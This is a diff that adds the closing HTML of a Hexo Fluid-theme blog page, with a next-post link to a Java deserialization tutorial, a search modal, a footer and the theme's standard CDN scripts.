+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/09/25/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-03-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="java反序列化入门篇-03-动态代理">
+                        <span class="hidden-mobile">java反序列化入门篇-03-动态代理</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo ⭐</span></a> <a href="https://blog.yunli1.com/" target="_blank" rel="nofollow noopener"><span>yunli</span></a> <br> <span>主题</span> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
